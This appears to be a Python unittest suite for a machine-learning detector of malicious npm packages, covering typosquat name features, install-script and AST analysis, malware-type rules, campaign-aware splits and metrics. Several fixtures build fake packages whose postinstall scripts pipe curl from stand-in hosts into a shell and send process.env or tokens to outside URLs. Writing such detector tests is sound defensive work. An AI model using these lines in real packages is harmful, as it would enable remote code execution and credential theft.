"""Guards for the supply-chain pipeline. Run from ml/: python -m unittest discover -s tests"""
import io
import json
import sys
import tarfile
import unittest
import zipfile
from pathlib import Path

import numpy as np
import pandas as pd

sys.path.insert(0, str(Path(__file__).resolve().parents[1] / "supplychain"))

import importlib.util  # noqa: E402


def _load(unique_name, filename):
    """supplychain/train.py and ml/train.py share a module name: load by path to avoid the clash."""
    spec = importlib.util.spec_from_file_location(
        unique_name, Path(__file__).resolve().parents[1] / "supplychain" / filename)
    module = importlib.util.module_from_spec(spec)
    sys.modules[unique_name] = module
    spec.loader.exec_module(module)
    return module


clean = _load("sc_clean", "clean.py")
features = _load("sc_features", "features.py")
sc_train = _load("sc_train", "train.py")


def make_tgz(files: dict) -> bytes:
    buf = io.BytesIO()
    with tarfile.open(fileobj=buf, mode="w:gz") as tf:
        for name, text in files.items():
            data = text.encode()
            info = tarfile.TarInfo(name)
            info.size = len(data)
            tf.addfile(info, io.BytesIO(data))
    return buf.getvalue()


class FeatureTests(unittest.TestCase):
    def test_name_distance_ignores_the_package_itself(self):
        popular = features.TOP_NAMES[0]
        self.assertGreater(features.name_features(popular)["name_min_edit_dist"], 0)

    def test_typosquat_is_near_popular(self):
        self.assertEqual(features.name_features("lodahs")["name_near_popular"], 1)

    def test_suspicious_install_script_and_code_are_detected(self):
        blob = make_tgz({
            "package/package.json": json.dumps({"name": "x", "scripts": {"postinstall": "node run.js"}}),
            "package/run.js": "const c=require('child_process');c.exec('curl http://1.2.3.4/x | sh');"
                              "eval(Buffer.from('aGk=','base64').toString());process.env.TOKEN",
        })
        f = features.content_features(blob, "tgz")
        self.assertEqual(f["has_install_script"], 1)
        self.assertEqual(f["install_script_runs_node"], 1)
        self.assertGreaterEqual(f["n_child_process"], 1)
        self.assertGreaterEqual(f["n_eval"], 1)
        self.assertGreaterEqual(f["n_env_access"], 1)
        self.assertGreaterEqual(f["n_ip_literal"], 1)

    def test_archive_without_package_json_is_missing_not_zero(self):
        f = features.content_features(make_tgz({"a/index.js": "1+1"}), "tgz")
        self.assertEqual(f["has_package_json"], 0)
        self.assertNotIn("has_install_script", f)  # unknown -> NaN later, imputed on train only

    def test_encrypted_zip_is_read_in_memory_with_the_dataset_password(self):
        # a plain (unencrypted) zip is also readable: the password is simply ignored
        buf = io.BytesIO()
        with zipfile.ZipFile(buf, "w") as zf:
            zf.writestr("p/package.json", json.dumps({"name": "y"}))
            zf.writestr("p/i.js", "console.log(1)")
        f = features.content_features(buf.getvalue(), "zip")
        self.assertEqual(f["has_package_json"], 1)


class NameShapeTests(unittest.TestCase):
    def test_generated_spam_name_has_spam_shape(self):
        f = features.name_features("ade-klanting44-sukiwir")
        self.assertEqual(f["name_spam_shape"], 1)
        self.assertEqual(f["name_tokens_with_digits"], 1)

    def test_normal_names_do_not(self):
        for name in ("lodash", "@babel/core", "express-session", "left-pad"):
            self.assertEqual(features.name_features(name)["name_spam_shape"], 0, name)

    def test_gibberish_has_long_consonant_run(self):
        self.assertGreaterEqual(features.name_features("xqzvbnm-91k")["name_longest_consonant_run"], 6)


class InstallSemanticsTests(unittest.TestCase):
    def test_native_build_script_looks_legitimate(self):
        blob = make_tgz({
            "package/package.json": json.dumps({"name": "n", "scripts": {"install": "node-gyp rebuild"}}),
            "package/binding.gyp": "{}", "package/src/a.cc": "int x;", "package/LICENSE": "MIT",
        })
        f = features.content_features(blob, "tgz")
        self.assertEqual(f["hook_known_build_tool"], 1)
        self.assertEqual(f["has_binding_gyp"], 1)
        self.assertEqual(f["n_native_sources"], 1)
        self.assertEqual(f["hook_url_unknown_host"], 0)
        self.assertEqual(f["has_license_file"], 1)

    def test_phone_home_script_is_flagged(self):
        blob = make_tgz({
            "package/package.json": json.dumps({"name": "n", "scripts": {
                "postinstall": "curl http://evil-host.xyz/p.sh | sh && node run.js"}}),
            "package/run.js": "require('https').get('https://x.io/'+JSON.stringify(process.env))",
        })
        f = features.content_features(blob, "tgz")
        self.assertEqual(f["hook_pipe_to_shell"], 1)
        self.assertGreaterEqual(f["hook_url_unknown_host"], 1)
        self.assertEqual(f["hook_target_found"], 1)
        self.assertGreaterEqual(f["hook_target_network"], 1)
        self.assertGreaterEqual(f["hook_target_env"], 1)


types_rules = _load("sc_types_rules", "types_rules.py")
astfeat = _load("sc_astfeat", "astfeat.py")


class V4Tests(unittest.TestCase):
    def test_scoped_name_spelling_is_normalised(self):
        self.assertEqual(features.normalize_name("@bun-sh@types"), "@bun-sh/types")
        self.assertEqual(features.normalize_name("@babel/core"), "@babel/core")
        self.assertEqual(features.normalize_name("lodash"), "lodash")

    def test_absurd_versions_flag_confusion_but_not_year_versions(self):
        self.assertEqual(features.version_features("999.9.9")["version_absurd_high"], 1)
        self.assertEqual(features.version_features("99.99.99")["version_all_nines"], 1)
        self.assertEqual(features.version_features("2023.1.0")["version_absurd_high"], 0)
        self.assertEqual(features.version_features("4.17.21")["version_absurd_high"], 0)
        self.assertEqual(features.version_features(None)["version_absurd_high"], 0)

    def test_ast_sees_secret_read_and_network_in_same_function(self):
        src = "function f(){const t=process.env.TOKEN;require('https').get('https://x.io/'+t);} f();"
        f = astfeat.ast_features([src])
        self.assertEqual(f["ast_parse_ok"], 1)
        self.assertEqual(f["ast_source_and_sink_in_function"], 1)

    def test_ast_flags_dynamic_require_and_eval_and_survives_bad_syntax(self):
        f = astfeat.ast_features(["const m='child_'+'process'; require(m); eval(atob('aa'));"])
        self.assertEqual(f["ast_dynamic_require"], 1)
        self.assertEqual(f["ast_dynamic_eval"], 1)
        self.assertEqual(astfeat.ast_features(["this is ((( not js"])["ast_parse_ok"], 0)

    def test_malicious_types_follow_the_rules(self):
        t = types_rules.assign_type
        self.assertEqual(t({"version_absurd_high": 1, "code_bytes": 900}), "dependency_confusion")
        self.assertEqual(t({"code_bytes": 20, "has_install_script": 0}), "empty_placeholder")
        self.assertEqual(t({"code_bytes": 2000, "has_install_script": 1, "ast_source_and_sink_in_function": 1}),
                         "credential_stealer")
        self.assertEqual(t({"code_bytes": 2000, "has_install_script": 1, "hook_pipe_to_shell": 1}),
                         "downloader_dropper")
        self.assertEqual(t({"code_bytes": 2000, "has_install_script": 1, "n_obfuscator_ident": 9}),
                         "obfuscated_payload")
        self.assertEqual(t({"code_bytes": 2000, "has_install_script": 0, "name_spam_shape": 1}), "spam_farm")
        self.assertEqual(t({"code_bytes": 2000, "has_install_script": 1}), "other_malicious")

    def test_add_types_leaves_benign_alone(self):
        df = pd.DataFrame([{"label": 0, "code_bytes": 10, "has_install_script": 0},
                           {"label": 1, "code_bytes": 10, "has_install_script": 0}])
        self.assertEqual(list(types_rules.add_types(df)["mal_type"]), ["benign", "empty_placeholder"])


class SplitTests(unittest.TestCase):
    def test_campaign_never_crosses_splits_and_identical_code_is_one_campaign(self):
        rows = []
        for i in range(60):  # one attacker, same payload under 60 names
            rows.append({"name": f"evil-pkg-{i}x", "label": 1, "content_hash": f"h{i}", "code_hash": "payload",
                         "code_bytes": 500.0, "n_text_files": 3.0})
        for i in range(140):
            rows.append({"name": "".join(np.random.default_rng(i).choice(list("abcdefghijklmnop"), 9)), "label": 0 if i % 3 else 1, "content_hash": f"b{i}",
                         "code_hash": f"c{i}", "code_bytes": float(np.random.default_rng(i).integers(10, 90000)),
                         "n_text_files": float(np.random.default_rng(i + 7).integers(1, 60))})
        df = pd.DataFrame(rows)
        groups, _, _ = clean.campaign_groups(df)
        self.assertEqual(len(set(groups[:60])), 1)
        df["group_id"] = groups
        df["split"] = clean.split(df, groups)
        self.assertEqual(df.groupby("group_id")["split"].nunique().max(), 1)


class MetricTests(unittest.TestCase):
    def test_realistic_prevalence_precision(self):
        # 90% recall, 1% FPR, 1 malicious in 1000 -> ~8%
        p = sc_train.prevalence_precision(0.9, 0.01)["1_in_1000"]
        self.assertAlmostEqual(p, 0.9 * 0.001 / (0.9 * 0.001 + 0.01 * 0.999), places=6)
        self.assertLess(p, 0.1)

    def test_wilson_interval_is_wide_for_small_samples(self):
        lo, hi = sc_train.wilson_interval(3, 17)
        self.assertLess(lo, 0.08)
        self.assertGreater(hi, 0.35)
        lo2, hi2 = sc_train.wilson_interval(300, 1700)
        self.assertLess(hi2 - lo2, 0.04)
        self.assertEqual(sc_train.wilson_interval(0, 0), (None, None))

    def test_hard_negatives_get_extra_weight_and_malware_does_not(self):
        df = pd.DataFrame({"label": [0, 0, 1, 1], "kind": ["hard_negative", "random", "hard_negative", "malicious_intent"]})
        w = sc_train.sample_weights(df, 5.0)
        self.assertEqual(list(w), [5.0, 1.0, 1.0, 1.0])

    def test_campaign_cap_limits_each_group(self):
        df = pd.DataFrame({"group_id": [1] * 100 + [2] * 3, "label": 1})
        capped = sc_train.cap_groups(df, cap=25)
        self.assertEqual(capped[capped.group_id == 1].shape[0], 25)
        self.assertEqual(capped[capped.group_id == 2].shape[0], 3)

    def test_campaign_recall_macro_vs_micro(self):
        df = pd.DataFrame({"group_id": [1] * 10 + [2], "label": 1})
        score = np.array([0.0] * 10 + [1.0])
        v = sc_train.campaign_recall(df, score, 0.5, big=5)
        self.assertAlmostEqual(v["micro"], 1 / 11)
        self.assertAlmostEqual(v["macro_by_campaign"], 0.5)


if __name__ == "__main__":
    unittest.main()
